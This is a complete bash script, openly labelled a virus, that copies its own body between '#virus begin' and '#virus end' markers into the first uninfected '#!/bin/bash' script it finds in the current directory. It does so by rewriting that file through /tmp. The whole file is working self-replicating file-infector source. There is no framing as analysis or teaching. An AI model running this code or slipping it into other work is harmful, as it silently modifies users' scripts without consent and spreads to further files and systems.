#!/bin/bash

#virus begin

VIRUS_BODY_START_MARKER='#virus begin'
VIRUS_BODY_END_MARKER='#virus end'

get_virus_body() {
	VIRUS_BODY_FIRST_LINE_NUMBER=`grep -x -n -m 1 "$VIRUS_BODY_START_MARKER" $0 | cut -f1 -d':'`
	VIRUS_BODY_LAST_LINE_NUMBER=`grep -x -n "$VIRUS_BODY_END_MARKER" $0 | tail -n 1 | cut -f1 -d':'`
	
	tail -n +"$VIRUS_BODY_FIRST_LINE_NUMBER" $0 | head -n $VIRUS_BODY_LAST_LINE_NUMBER
}

get_virus_body > /tmp/virus_body.sh

BASH_FILE_FIRST_LINE='#!/bin/bash'
CURRENT_DIRECTORY_OBJECTS=`ls -A`

for OBJECT in $CURRENT_DIRECTORY_OBJECTS
do
	# It's a readable and writeable file.
	if !(test -f $OBJECT && test -r $OBJECT && test -w $OBJECT); then
		continue
	fi
	
	# It's contain "#!/bin/bash" in first line
	if !(head -n 1 $OBJECT | grep -q $BASH_FILE_FIRST_LINE); then
		continue
	fi
	
	# It's not yet infected.
	if grep -q "$VIRUS_BODY_START_MARKER" $OBJECT ; then
		continue
	fi
	
	insert_virus_into_file() {
		cp $OBJECT /tmp
		echo $BASH_FILE_FIRST_LINE > $OBJECT
		cat /tmp/virus_body.sh >> $OBJECT
		echo '' >> $OBJECT
		cat /tmp/$OBJECT | tail -n +2 >> $OBJECT
		rm /tmp/$OBJECT
	}
	
	insert_virus_into_file
	
	# Infecting just one file
	break
done

rm /tmp/virus_body.sh

#virus end